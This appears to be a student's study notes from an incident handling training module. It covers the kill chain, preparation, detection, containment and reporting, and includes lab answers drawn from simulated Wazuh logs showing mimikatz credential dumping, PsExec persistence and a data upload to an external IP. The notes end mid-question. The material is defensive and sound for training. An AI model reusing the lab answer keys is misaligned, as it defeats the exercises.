# Incident Handling Process

### Incident Handling

An event is an action occuring in a system or network. For example;

* A user sending an email.
* A mouse click.

An incident is an event with a negative consequence, a system crash is a good example.&#x20;

**Incident handling be defined through the following graph.**

<figure><img src=".gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Please see the following Real-World Incidents

#### Leaked Credentials

* `Colonial Pipeline Ransomware Attack`: The Colonial Pipeline, a major American oil pipeline system, fell victim to a ransomware attack. This [attack](https://en.wikipedia.org/wiki/Colonial_Pipeline_ransomware_attack) originated from a breached employee's personal password, likely found on the dark web, rather than a direct attack on the company's network. The attackers gained access to the company's systems using a compromised password for an inactive VPN (Virtual Private Network) account, which did not have Multi-Factor Authentication (MFA) enabled.

#### Default / Weak Credentials

* `Mirai Botnet (2016)`: The Mirai botnet scanned for IoT devices using factory or default credentials (e.g., admin/admin) and conscripted them into a massive DDoS botnet. This led to large-scale DDoS disruptions affecting companies like Dyn and OVH, with hundreds of thousands of devices infected. The root cause was the devices being shipped with unchanged default credentials and poor remote access security.
* `LogicMonitor Incident (2023)`: Some LogicMonitor customers were compromised because the vendor issued weak default passwords to customer accounts. Affected customers experienced follow-on ransomware incidents or unauthorized access. The root cause involved vendor-assigned weak/default credentials and delayed enforcement of password hardening.

#### Outdated Software / Unpatched Systems

* `Equifax (2017) Breach`: Attackers exploited a known Apache Struts vulnerability (CVE-2017-5638) in Equifax’s web application. This breach exposed the personal data of approximately 143–147 million people, leading to major regulatory and legal fallout. The incident occurred due to a failure to apply a publicly released patch in a timely manner.
* `WannaCry (2017)`: The WannaCry ransomware spread as a worm using the SMB EternalBlue exploit, affecting more than 200,000 systems across over 150 countries. High-profile impacts included hospitals and enterprises. This incident was due to unpatched Windows systems, despite the MS17-010 patch being available before the outbreak.

#### Rogue Employee / Insider Threat

* `Cash App / Block Inc. (2021 Disclosure; Public 2022 Notice)`: A former employee accessed the personal information of millions of Cash App users, as reported in company disclosures. Approximately 8.2 million current and former customers were potentially impacted, leading to regulatory scrutiny and settlements. The root cause was the abuse of legitimate employee access and insufficient internal controls and monitoring.

#### Phishing / Social Engineering

* `Industry Trend & Representative Data`: Phishing is a pervasive vector used to obtain credentials, deliver malware, or trick users into enabling remote access. It frequently leads to account compromise, fraud, and network footholds. A significant portion of breaches over multiple years are linked to phishing.
* `U.S. Interior Department Phishing Attack`: Attackers used an "evil twin" technique to trick individuals into connecting to a fake Wi-Fi network, allowing hackers to steal credentials and access the network. This incident revealed a lack of secure wireless network infrastructure and insufficient security measures, including weak user authentication and inadequate network testing.
* `2020 Twitter Account Hijacking`: In 2020, many high-profile Twitter accounts were compromised by outside parties to promote a bitcoin scam. Attackers gained access to Twitter's administrative tools, allowing them to alter accounts and post tweets directly. They appeared to have used social engineering to gain access to the tools via Twitter employees.

#### Supply-Chain Attack

* `SolarWinds Orion (2020)`: Nation-state actors compromised the SolarWinds build/release environment and injected a malicious backdoor into Orion updates, which were distributed to thousands of customers. This caused wide-reaching espionage and unauthorized access across government and private sectors, leading to protracted detection and remediation efforts.

### Cyber Kill Chain

This Lifecycle describes how attacks manifest themselves.&#x20;

<figure><img src=".gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Stages Of The Cyber Kill Chain**

1. Recon - The initial stage where the attacker chooses their target. The attacker will perform information gathering from web sources, and documentation on the targets organisations website.![](<.gitbook/assets/image (4) (1).png>)
2. Weaponise - Malware to be used for initial access is developed and embedded into some type of exploit.
3. Delivery - The exploit or payload is delivered to the victim, traditionally done through phishing emails.
4. Exploitation - The moment where the exploit is triggered, the attacker attempts to execute code on the target system.
5. Installation - Initial stager is executed and is running on the compromised machine. Common techniques are;
   1. Droppers - A small piece of code designed to install malware on the system and execute it.
   2. Backdoors - Type of malware designed to provide the attacker with ongoing access to the compromised system.
   3. Rootkits - Type of malware designed to hide its presence on a compromised system.
6. Command and Control - Attacker establishes a remote access capability to the compromised machine.&#x20;
7. Action - The objective of each attack can vary, some may exfiltrate data others may try to obtain the highest level of access possible.

### MITRE ATT\&CK Framework

{% embed url="https://attack.mitre.org/" %}

it is a granular matrix-based knowledge base of adversary tactics and techniques used to acheive specific goals.

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

**Tactic -** High level adversary objective during intrusion.

**Technique -** A specific method adversaries use to achieve a tactic

**Sub-Technique -** Sub-techniques are children of techniques that capture a particular implementation or target. Sub-technique IDs extend the parent technique

### Pyramid of Pain

How much effort it takes for an adversary to change their tactics.

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Question: In which stage of the Cyber Kill Chain is malware developed?

Answer: Weaponize

Question: Check the alert with reference 67c202 (LSASS Access) in TheHive, and provide the MITRE rule ID as the answer.

Method: Go to the web browser and search the ip address with port 9000. (\<ip>:9000)

Search the Reference number and you will find the mitreid: T1003.001.

***

### Incident Handling Process Overview

Incident handlers spend most of their time in the first two stages, `preparation` and `detection and analysis`. This is where we, as incident handlers, spend much time improving ourselves and looking for the next malicious event. When a malicious event is detected, we move on to the next stage and respond to the event (but there should always be resources operating in the first two stages, so there is no disruption of preparation and detection capabilities)

So, incident handling has two main activities, which are `investigating` and `recovering`. The investigation aims to:

* `Discover` the initial '`patient zero`' victim and create an ongoing (if still active) incident timeline.
* Determine which `tools` and malware the adversary used.
* `Document` the compromised systems and what the adversary has done.

Question: True or False: Incident handling contains two main activities: investigating and reporting.

Answer: False

***

### Preparation Stage

The first is the establishment of incident handling capability within the organization. The second is the ability to protect against and prevent IT security incidents by implementing appropriate protective measures

### Clear Policies & Documentation

Some of the written policies and documentation should contain an up-to-date version of the following information:

* Contact information and roles of the incident handling team members.
* Contact information for the legal and compliance department, management team, IT support, communications and media relations department, law enforcement, internet service providers, facility management, and external incident response team.
* Incident response policy, plan, and procedures.
* Incident information sharing policy and procedures.
* Baselines of systems and networks, out of a golden image and a clean state environment.
* Network diagrams.
* Organization-wide asset management database.
* User accounts with excessive privileges that can be used on-demand by the team when necessary (also for business-critical systems, which are handled with the skills needed to administer that specific system). These user accounts are normally enabled when an incident is confirmed during the initial investigation and then disabled once it is over. A mandatory password reset is also performed when disabling the users.
* Ability to acquire hardware, software, or an external resource without a complete procurement process (urgent purchase of up to a certain amount). The last thing you need during an incident is to wait for weeks for the approval of a $500 tool.
* Forensic/Investigative cheat sheets.

### Tools (Software & Hardware)

Moving forward, we also need to ensure that we have the right tools to perform the job. These include, but are not limited to:

* An additional laptop or a forensic workstation for each incident handling team member to preserve disk images and log files, perform data analysis, and investigate without any restrictions (we know malware will be tested here, so tools such as antivirus should be disabled). These devices should be handled appropriately and not in a way that introduces risks to the organization.
* Digital forensic image acquisition and analysis tools.
* Memory capture and analysis tools.
* Live response capture and analysis tools.
* Log analysis tools.
* Network capture and analysis tools.
* Network cables and switches.
* Write blockers.
* Hard drives for forensic imaging.
* Power cables.
* Screwdrivers, tweezers, and other relevant tools to repair or disassemble hardware devices if needed.
* Indicator of Compromise (IOC) creator and the ability to search for IOCs across the organization.
* Chain of custody forms.
* Encryption software.
* Ticket tracking system.
* Secure facility for storage and investigation.
* Incident handling system independent of your organization's infrastructure.

Question: What should we have prepared and always ready to 'grab and go'?

Answer: jump bag

Question: True or False: Using baselines, we can discover deviations from the golden image, which aids us in discovering suspicious or unwanted changes to the configuration.

Answer: True

**DMARC**&#x20;

[DMARC](https://dmarcly.com/blog/how-to-implement-dmarc-dkim-spf-to-stop-email-spoofing-phishing-the-definitive-guide#what-is-dmarc) is an email protection mechanism against phishing built on top of the already existing [SPF](https://dmarcly.com/blog/how-to-implement-dmarc-dkim-spf-to-stop-email-spoofing-phishing-the-definitive-guide#what-is-spf) and [DKIM](https://dmarcly.com/blog/how-to-implement-dmarc-dkim-spf-to-stop-email-spoofing-phishing-the-definitive-guide#what-is-dkim). The idea behind DMARC is to reject emails that 'pretend' to originate from our organisation.

**Endpoint Hardening & EDR**

Endpoint devices (workstations, laptops, etc.) are the entry points for most of the attacks that we face on a daily basis. Considering that most threats will originate from the internet and target users who are browsing websites, opening attachments, or running malicious executables, a significant percentage of this activity will occur on their corporate endpoints.

There are a few widely recognized endpoint hardening standards now, with CIS and Microsoft baselines being the most popular, and these should really be the building blocks for our organization's hardening baselines. Some highly important actions (that actually work) to note and do something about are:

* Disable LLMNR/NetBIOS.
* Implement LAPS and remove administrative privileges from regular users.
* Disable or configure PowerShell in "ConstrainedLanguage" mode.
* Enable Attack Surface Reduction (ASR) rules if using Microsoft Defender.
* Implement whitelisting. We know this is nearly impossible to implement. Consider at least blocking execution from user-writable folders (Downloads, Desktop, AppData, etc.). These are the locations where exploits and malicious payloads will initially find themselves. Remember to also block script types such as .hta, .vbs, .cmd, .bat, .js, and similar. We need to pay attention to [LOLBin](https://lolbas-project.github.io/) files while implementing whitelisting. Do not overlook them; they are really used in the wild as initial access to bypass whitelisting.
* Utilize host-based firewalls. As a bare minimum, block workstation-to-workstation communication and block outbound traffic to LOLBins.
* Deploy an EDR product. At this point in time, [AMSI](https://learn.microsoft.com/en-us/windows/win32/amsi/how-amsi-helps) provides great visibility into obfuscated scripts for antimalware products to inspect the content before it gets executed. It is highly recommended that we only choose products that integrate with AMSI.

**Network Protection**

Network segmentation is a powerful technique for preventing a breach from spreading across the entire organization. Business-critical systems must be isolated, and connections should be allowed only as required by the business. Internal resources should not face the Internet directly (unless placed in a DMZ).

Additionally, when speaking of network protection, we should consider IDS/IPS (Intrusion Detection System/Intrusion Prevention System) systems. Their power really shines when SSL/TLS interception is performed so that they can identify malicious traffic based on content on the wire and not based on the reputation of IP addresses, which is a traditional and very inefficient way of detecting malicious traffic.

Additionally, ensure that only organization-approved devices can access the network. Solutions such as 802.1x can be utilized to reduce the risk of bring your own device (BYOD) or malicious devices connecting to the corporate network. If we are a cloud-only company using, for example, Azure/Azure AD (now called Microsoft Entra ID), then we can achieve similar protection with Conditional Access policies that will allow access to organization resources only if we are connecting from a company-managed device.

**Privilege Identity Management / MFA/ Passwords**

At this point in time, stealing privileged user credentials is the most common escalation path in Active Directory environments. Additionally, a common mistake is that admin users either have a weak (but often complex) password or a shared password with their regular user account (which can be obtained via multiple attack vectors such as keylogging). For reference, a weak but complex password is "Password1!". It includes uppercase, lowercase, numerical, and special characters, but despite this, it's easily predictable and can be found in many password lists that adversaries employ in their attacks. It is recommended to teach employees to use passphrases because they are harder to guess and difficult to brute force. An example of a passphrase that is easy to remember yet long and complex is "i LIK3 my coffeE warm". If one knows a second language, they can mix up words from multiple languages for additional protection.

Multi-factor authentication (MFA) is another identity-protecting solution that should be implemented at least for any type of administrative access to `all` applications and devices.\


Question: What mechanism can we use to block phishing emails pretending to originate from our mail server?

Answer: DMARC

Question: True or False: The "Summer2021!" password meets the complex password criteria but can be easily guessed or brute-forced.

Answer: True

***

### Detection & Analysis

The `Detection & Analysis` stage involves all aspects of detecting an incident, such as utilizing sensors, logs, and trained personnel. It also includes information and knowledge sharing, as well as utilizing context-based threat intelligence. Segmentation of the architecture and having a clear understanding of and visibility within the network are also important factors.

Threats are introduced to the organization via an infinite number of attack vectors, and their detection can come from sources such as:

* An employee who notices abnormal behavior.
* An alert from one of our tools (EDR, IDS, Firewall, SIEM, etc.).
* Threat hunting activities.
* A third-party notification informing us that they discovered signs of our organization being compromised.

It is highly recommended to create levels of detection by logically categorizing our network as follows:

* Detection at the network perimeter (using firewalls, internet-facing network intrusion detection/prevention systems, demilitarized zone, etc.).
* Detection at the internal network level (using local firewalls, host intrusion detection/prevention systems, etc.).
* Detection at the endpoint level (using antivirus systems, endpoint detection & response systems, etc.).
* Detection at the application level (using application logs, service logs, etc.).

### Initial Investigation

When a security incident is detected, we should conduct some initial investigation and establish context before assembling the team and calling an organization-wide incident response. Think about how information is presented in the event of an administrative account connecting to an IP address at HH:MM:SS. Without knowing what system is on that IP address and which time zone the time refers to, we may easily jump to the wrong conclusion about what this event is about. To sum up, we should aim to collect as much information as possible at this stage about the following:

* Date/Time when the incident was reported. Additionally, who detected the incident and/or who reported it?
* How was the incident detected?
* What was the incident? Phishing? System unavailability? etc.
* Assemble a list of impacted systems (if relevant).
* Document who has accessed the impacted systems and what actions have been taken. Make a note of whether this is an ongoing incident or if the suspicious activity has been stopped.
* Physical location, operating systems, IP addresses and hostnames, system owner, system's purpose, current state of the system.
* List of IP addresses, if malware is involved, time and date of detection, type of malware, systems impacted, export of malicious files with forensic information on them (such as hashes, copies of the files, etc.).

With that information at hand, we can make decisions based on the knowledge we have gathered. What does this mean? We would likely take different actions if we knew that the CEO's laptop was compromised as opposed to an intern's.

With the initially gathered information, we can start building an incident timeline. This timeline will keep us organized throughout the event and provide an overall picture of what happened. The events in the timeline are sorted based on when they occurred. Note that during the investigative process later on, we will not necessarily uncover evidence in this chronological order. However, when we sort the evidence based on when it occurred, we will get context from the separate events that took place. The timeline can also shed light on whether newly discovered evidence is part of the current incident. For example, imagine that what we thought was the initial payload of an attack was later discovered to be present on another device two weeks ago. We will encounter situations where the data we are looking at is extremely relevant and situations where the data is unrelated and we are looking in the wrong place. Overall, the timeline should contain the information described in the following columns:

| `Date` | `Time of the event` | `hostname` | `event description` | `data source` |
| ------ | ------------------- | ---------- | ------------------- | ------------- |

**Incident Severity & Extent Questions**

When handling a security incident, we should also try to answer the following questions to get an idea of the incident's severity and extent:

* What is the exploitation impact?
* What are the exploitation requirements?
* Can any business-critical systems be affected by the incident?
* Are there any suggested remediation steps?
* How many systems have been impacted?
* Is the exploit being used in the wild?
* Does the exploit have any worm-like capabilities?

The last two can possibly indicate the level of sophistication of an adversary.

As you can imagine, high-impact incidents will be handled promptly, and incidents with a high number of impacted systems will have to be escalated.

Question: True or False: Can a third-party vendor be a source of detecting a compromise?

Answer: True

Question: Assign the Mimikatz alert (shown in the section) to yourself in TheHive, and go through the description and summary. Provide the username of the person who executed the Mimikatz tool. The answer format is "domain\user\_name."

Method: Go to the hive and find the event HTB are referencing and then check the summary.

Answer: insight\svc\_deployer

When an investigation is started, we aim to understand `what happened` and `how it happened`. To analyze the incident-related data properly and efficiently, the incident handling team members need deep technical knowledge and experience in the field. One may ask, "Why do we care about how an incident happened? Why don't we simply rebuild the impacted systems and basically forget it ever happened?"

If we don't know how an incident happened or what was impacted, then any remedial steps we take will not ensure that the attacker cannot repeat their actions to regain access. If we, on the other hand, know exactly how the adversary got in, what tools they used, and which systems were impacted, then we can plan our remediation to ensure that this attack path cannot be replicated.

### The Investigation

The investigation starts based on the initially gathered (and limited) information that contains what we know about the incident so far. With this initial data, we will begin a 3-step cyclic process that will iterate over and over again as the investigation evolves. This process includes:

* Creation and usage of indicators of compromise (IOCs).
* Identification of new leads and impacted systems.
* Data collection and analysis from the new leads and impacted systems.

![Flowchart showing investigation process: Initial Investigation Data leads to IOCs, Compromised Systems, and Collection & Analysis.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/148/ir-ioc.png)

Let us now elaborate more on the process depicted above.

***

#### Initial Investigation Data

In order to reach a conclusion, an investigation should be based on valid leads that have been discovered not only during this initial phase but throughout the entire investigation process. The incident handling team should constantly bring up new leads and not focus solely on a specific finding, such as a known malicious tool. Narrowing an investigation down to a specific activity often results in limited findings, premature conclusions, and an incomplete understanding of the overall impact.

***

#### Creation & Usage Of IOCs

An indicator of compromise (IOC) is a `sign that an incident has occurred`. IOCs are documented in a structured manner, which represents the `artifacts` of the compromise. Examples of IOCs can be IP addresses, hash values of files, and file names. In fact, because IOCs are so important to an investigation, special languages such as `OpenIOC` have been developed to document them and share them in a standard manner. Another widely used standard for IOCs is `YARA`. There are a number of free tools that can be utilized, such as Mandiant's `IOC Editor`, to create or edit IOCs. Using these languages, we can describe and use the artifacts that we uncover during an incident investigation. We may even obtain IOCs from third parties if the adversary or the attack is known. For example, CISA publishes the IOCs in a format called `STIX` (`Structured Threat Information eXpression`). STIX is an open-source, machine-readable language and serialization format, primarily in JSON, used to exchange cyber threat intelligence (CTI) in a standardized and consistent way.

As an example, in [this report](https://www.cisa.gov/news-events/alerts/2025/08/06/cisa-releases-malware-analysis-report-associated-microsoft-sharepoint-vulnerabilities), we can check the "Downloadable copy of IOCs associated with this malware" section for the STIX file, which contains the IOCs in JSON format.

Code: json

```json
...SNIP...
        {
            "type": "file",
            "spec_version": "2.1",
            "id": "file--474454e8-d393-5a4f-9069-19631ea9d397",
            "hashes": {
                "MD5": "40e609840ef3f7fea94d53998ec9f97f",
                "SHA-1": "141af6bcefdcf6b627425b5b2e02342c081e8d36",
                "SHA-256": "3461da3a2ddcced4a00f87dcd7650af48f97998a3ac9ca649d7ef3b7332bd997",
                "SHA-512": "deaed6b7657cc17261ae72ebc0459f8a558baf7b724df04d8821c7a5355e037a05c991433e48d36a5967ae002459358678873240e252cdea4dcbcd89218ce5c2",
                "SSDEEP": "384:cMQLQ5VU1DcZugg2YBAxeFMxeFAReF9ReFj4U0QiKy8Mg3AxeFaxeFAReFLxTYma:ElHh1gtX10u5A"
            },
            "size": 13373,
            "name": "osvmhdfl.dll",
            "object_marking_refs": [
                "marking-definition--94868c89-83c2-464b-929b-a1a8aa3c8487",
                "marking-definition--d896763f-3f6f-4917-86e8-1a4b043d9771"
            ],
            "extensions": {
                "windows-pebinary-ext": {
                    "pe_type": "dll",
                    "number_of_sections": 4,
                    "time_date_stamp": "2025-07-22T08:33:22Z",
                    "size_of_optional_header": 512,
                    "sections": [
                        {
                            "name": "header",
                            "size": 512,
                            "entropy": 2.545281,
                            "hashes": {
                                "MD5": "2a11da5809d47c180a7aa559605259b5"
                            }
                        },
                        {
                            "name": ".text",
                            "size": 4608,
                            "entropy": 4.532967,
                            "hashes": {
                                "MD5": "531ff1038e010be3c55de9cf1f212b56"
                            }
                        },
                        {
                            "name": ".rsrc",
                            "size": 1024,
                            "entropy": 2.170401,
                            "hashes": {
                                "MD5": "ef6793ef1a2f938cddc65b439e44ea07"
                            }
                        },
                        {
                            "name": ".reloc",
                            "size": 512,
                            "entropy": 0.057257,
                            "hashes": {
                                "MD5": "403090c0870bb56c921d82a159dca5a3"
                            }
                        }
                    ]
                }
            }
        },
...SNIP...
```

In TheHive, we can add IOCs in the observables section of an alert.

![TheHive “Observables” tab for alert “\[InsightNexus\] Admin Login via ManageEngine Web Console.” Two observables listed: hostname “manage\[.\]insightnexus\[…\]” and IP “103\[.\]112\[.\]60\[.\]117,” both tagged TLP:AMBER and PAP:AMBER with no reports. On the right, “Adding an Observable” panel shows a Type dropdown (options: autonomous-system, domain, file, filename, fqdn, hash, hostname, ip), and an “Is IOC” toggle (off), plus fields for Tags and Description.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/148/hivealert2.png)

To leverage IOCs, we will have to deploy an `IOC-obtaining/IOC-searching tool` (native or third-party and possibly at scale). A common approach is to utilize `WMI` or `PowerShell` for IOC-related operations in Windows environments.

A word of caution! During an investigation, we have to be extra careful to prevent the credentials of our highly privileged user(s) from being cached when connecting to (potentially) compromised systems (or any systems, really). More specifically, we need to ensure that only connection protocols and tools that don't cache credentials upon a successful login are utilized (such as `WinRM`). Windows logons with `logon type 3 (Network Logon)` typically don't cache credentials on the remote systems. The best example of "know your tools" that comes to mind is "PsExec". When "PsExec" is used with explicit credentials, those credentials are cached on the remote machine. When "PsExec" is used without credentials through the session of the currently logged-on user, the credentials are not cached on the remote machine. This is a great example of demonstrating how the same tool leaves different tracks, so we must be aware.

***

#### Identification Of New Leads & Impacted Systems

After searching for IOCs, we expect to have some hits that reveal other systems with the same signs of compromise. These hits may not be directly associated with the incident we are investigating. Our IOC could be, for example, too generic. We need to identify and `eliminate false positives`. We may also end up in a position where we come across a large number of hits. In this case, we should prioritize the ones we will focus on, ideally those that can provide us with new leads after a potential forensic analysis.

***

#### Data Collection and Analysis from the New Leads and Impacted Systems

Once we have identified systems that include our IOCs, we will want to `collect and preserve the state` of those systems for further analysis in order to uncover new leads and/or answer investigative questions about the incident. Depending on the system, there are multiple approaches to how and what data to collect. Sometimes we want to perform a '`live response`' on a system as it is running, while in other cases, we may want to shut down a system and then perform any analysis on it. Live response is the most common approach, where we collect a predefined set of data that is usually rich in artifacts that may explain what happened to a system. Shutting down a system is not an easy decision when it comes to preserving valuable information because, in many cases, much of the artifacts will only live within the RAM memory of the machine, which will be lost if the machine is turned off. Regardless of the collection approach we choose, it is vital to ensure that minimal interaction with the system occurs to avoid altering any evidence or artifacts.

Once the data has been collected, it is time to analyze it. This is often the most time-consuming process during an incident. Malware analysis and disk forensics are the most common examination types. Any newly discovered and validated leads are added to the timeline, which is constantly updated. Also, note that memory forensics is a capability that is becoming more and more popular and is extremely relevant when dealing with advanced attacks.

Keep in mind that during the data collection process, we should keep track of the `chain of custody` to ensure that the examined data is court-admissible if legal action is to be taken against an adversary.

***

#### Use of AI in Threat Detection

Artificial Intelligence (AI) is transforming how organizations detect, triage, and respond to security incidents. In traditional IR workflows, analysts manually review logs, alerts, and reports. This process usually takes hours or days. AI `automates much of this analysis`, reducing response time and improving accuracy by learning from historical incidents and `identifying behavioral anomalies` faster than humans.

For example: Elastic Security’s "`Attack Discovery`" feature uses generative AI to analyze events from thousands of detections, summarizing and clustering related alerts into an attack story.

AI Attack Discovery leverages `LLMs` (large language models) to analyze alerts in an environment and identify threats. The summary represents an attack and shows relationships among multiple alerts to help us identifying which users and hosts are involved. This also show MITRE ATT\&CK mappings. Here's an example of how the attack discovery looks like:

![Elastic detection page titled “BPFDoor Linux backdoor deployment” (status Open, 4 alerts). Summary: On host SRVNIX05, the BPFDoor backdoor was extracted, copied, and executed by user root. Details show root unzips file “74ef6cc38f5a1a80148752b63c117e6846984debd2af806c65887195a8eecc56” into /home/ubuntu/... then a bash shell copies it to /dev/shm/kdmtmpflush, sets chmod 755, and runs it with elevated permissions; cleanup removes the original. File is identified as Linux.Trojan.BPFDoor. Justification notes all alerts tie to host SRVNIX05 and user root with a clear sequence from extraction to execution and detection. Attack Chain timeline highlights Initial Access, Execution, Persistence, and Defense Evasion. Buttons: View in AI Assistant, Investigate in Timeline.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/148/ai-attack.png)

In this discovery, AI helped by going through multiple alerts and generated a comprehensive overview of the attack, identifying key activities that occurred during the incident. AI can help in incident response as well. Some of the use cases include:

* Automated Triage & Alert Prioritization
* Incident Correlation & Timeline Reconstruction
* Automated Response Playbooks
* AI Assistance in Post-Incident Analysis & Learning

Question: During an investigation, we discovered a malicious file with an MD5 hash value of 'b40f6b2c167239519fcfb2028ab2524a'. What do we usually call such a hash value in investigations? Answer format: Abbreviation

Answer: IOC

Question: In TheHive, check the alert with rule=92153 related to the VaultCli.dll module. What is the MD5 hash value mentioned in the alert?

Answer: FCDE97D37B7C0CADB3BC71267BEB5405

Question: True/False: As an analyst, you detected lateral movement attempts to systems owned by another department (e.g., finance). As it belongs to another department, you will not perform escalation internally.

Answer: False

***

### Containment, Eradiaction and Recovery

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

### Containment

In this stage, we take action to prevent the spread of the incident. We divide the actions into `short-term containment` and `long-term containment`. It is important that containment actions are coordinated and executed across all systems simultaneously. Otherwise, we risk notifying attackers that we are after them, in which case they might change their techniques and tools in order to persist in the environment.

In short-term containment, the actions taken leave a minimal footprint on the systems on which they occur. Some of these actions can include placing a system in a separate/isolated VLAN, pulling the network cable out of the system(s), or modifying the attacker's C2 DNS name to a system under our control or to a non-existing one. The actions here contain the damage and provide time to develop a more concrete remediation strategy. Additionally, since we keep the systems unaltered (as much as possible), we have the opportunity to take forensic images and preserve evidence if this wasn't already done during the investigation (this is also known as the `backup` substage of the containment stage). If a short-term containment action requires shutting down a system, we have to ensure that this is communicated to the business and appropriate permissions are granted.

In long-term containment actions, we focus on persistent actions and changes. These can include changing user passwords, applying firewall rules, inserting a host intrusion detection system, applying a system patch, and shutting down systems. While performing these activities, we should keep the business and the relevant stakeholders updated. Bear in mind that just because a system is now patched does not mean that the incident is over. Eradication, recovery, and post-incident activities are still pending.

***

### Eradication

Once the incident is contained, eradication is necessary to eliminate both the root cause of the incident and what is left of it to ensure that the adversary is out of the systems and network. Some of the activities in this stage include removing the detected malware from systems, rebuilding some systems, and restoring others from backup. During the eradication stage, we may extend the previously performed containment activities by applying additional patches, that were not immediately required. Additional system-hardening activities are often performed during the eradication stage (not only on the impacted system but across the network in some cases).

***

### Recovery

In the recovery stage, we bring systems back to normal operation. Of course, the business needs to verify that a system is in fact working as expected and that it contains all the necessary data. When everything is verified, these systems are brought into the production environment. All restored systems will be subject to heavy logging and monitoring after an incident, as compromised systems tend to be targets again if the adversary regains access to the environment in a short period of time. Typical suspicious events to monitor for are:

* Unusual logons (e.g., user or service accounts that have never logged-in there before).
* Unusual processes.
* Changes to the registry in locations that are usually modified by malware.

The recovery stage in some large incidents may take months, as it is often approached in phases. During the early phases, the focus is on increasing overall security to prevent future incidents through quick wins and the elimination of low-hanging fruit. The later phases focus on permanent, long-term changes to keep the organization as secure as possible.

Question: True or False: Patching a system is considered a short-term containment.

Answer: False

Question: During recovery, IOCs are still observed intermittently. Should recovery proceed, or should the case be escalated back to the investigation phase? Answer format: Recovery/Investigation

Answer: Investigation

***

### Post-Incident Activity Stage

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

### Reporting

The final report is a crucial part of the entire process. A complete report will contain answers to questions such as:

* What happened and when?
* How did the team perform in dealing with the incident in regard to plans, playbooks, policies, and procedures?
* Did the business provide the necessary information and respond promptly to aid in handling the incident efficiently? What can be improved?
* What actions have been implemented to contain and eradicate the incident?
* What preventive measures should be put in place to prevent similar incidents in the future?
* What tools and resources are needed to detect and analyze similar incidents in the future?

Such reports can eventually provide us with measurable results. For example, they can provide us with knowledge about how many incidents have been handled, how much time the team spends per incident, and the different actions that were performed during the handling process. Additionally, incident reports provide a reference for handling future events of a similar nature. In situations where legal action is to be taken, an incident report will also be used in court and as a source for identifying the costs and impact of incidents.

This stage is also a great place to train new team members by showing them how the incident was handled by more experienced colleagues. The team should also evaluate whether updating plans, playbooks, policies, and procedures is necessary. During the post-incident activity stage, it is important that we reevaluate the tools, training, and readiness of the team, as well as the overall team structure, and not focus only on the documentation and process front.

Question: True or False: We should train junior team members as part of these post-incident activities.

Answer: True

***

### Analysis of Insight Nexus Breach

Question: Download the Wazuh exported logs file (i.e., wazuh\_export.zip), and identify all events that indicate potential credential compromise. Check the event ID 4688 and verify the full path of the parent process name that executed a credential dumping tool. Answer format is C:\Pr........

Method: Download and unzip the json file,&#x20;

Command: grep -i -A 25 "mimikatz" wazuh\_export.json

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
└──╼ [★]$ grep -i -A 25 "mimikatz" wazuh_export.json 
            "newProcessName": "C:\\Users\\Administrator\\Downloads\\mimikatz.exe",
            "parentProcessName": "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
            "subjectDomainName": "INSIGHT",
            "subjectLogonId": "0x457a5240",
            "processId": "0x1718",
            "message": "A new process has been created. (simulated)"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "04dc4cd7-0a8b-482e-abc5-caec2af6d11e",
    "_source": {
      "agent": {
        "ip": "172.16.200.50",
        "name": "SCDC01",
        "id": "005"
      },
      "manager": {
        "name": "ubuntu"
      },
      "location": "EventChannel",
      "decoder": {
        "name": "windows_eventchannel"
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
└──╼ [★]$ 

```

Answer: C:\Program Files\Mozilla Firefox\firefox.exe

Question: Identify events that show persistence mechanisms. Type the value of imagePath for a persistence mechanism that took place on the host DB01.

Method: grep -E '90008' wazuh\_export.json -A 25

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
└──╼ [★]$ grep -E '90008' wazuh_export.json -A 25
        "id": "90008"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "7045",
            "systemTime": "2025-10-09T08:10:11.102140Z",
            "providerName": "Service Control Manager"
          },
          "eventdata": {
            "serviceName": "PSEXESVC",
            "imagePath": "C:\\Windows\\PSEXESVC.exe",
            "user": "SYSTEM",
            "message": "A service was installed to start from Windows root path"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "d49024e9-9311-48dd-82b4-8453d3ca7f7e",
    "_source": {
      "agent": {
        "ip": "201.10.112.150",
        "name": "DEV-021",

```

Answer: C:\Windows\PSEXESVC.exe

Question: Identify exfiltration activity — file(s) uploaded or outbound traffic. What is the external IP address to which the file diagnostics\_data.zip was uploaded?

Method: grep -E '90004' wazuh\_export.json -A 25

```
┌─[eu-academy-2]─[10.10.15.127]─[htb-ac-1926447@htb-c9jmnoyouh]─[~/Desktop]
└──╼ [★]$ grep -E '90004' wazuh_export.json -A 25
        "id": "90004"
      },
      "data": {
        "win": {
          "system": {
            "eventID": "3",
            "systemTime": "2025-10-09T08:08:41.102140Z",
            "providerName": "Microsoft-Windows-Sysmon/Operational"
          },
          "eventdata": {
            "image": "C:\\Users\\svc_deployer\\AppData\\Roaming\\updater.exe",
            "destinationIp": "93.184.216.34",
            "destinationPort": "443",
            "protocol": "tcp",
            "user": "insight\\svc_deployer",
            "details": "HTTP POST /upload diagnostics_data.zip"
          }
        }
      }
    }
  },
  {
    "_index": "wazuh-alerts-4.x-2025.10.09",
    "_id": "8a29f216-47f3-4c0d-8b72-ff80f6e4f008",
    "_source": {
      "agent": {

```

Answer: 93.184.216.34

Question: Which user tried to connect to the file share \\\fs01\projects?

Method: grep -E '92105' wazuh\_export.json -A 25

```
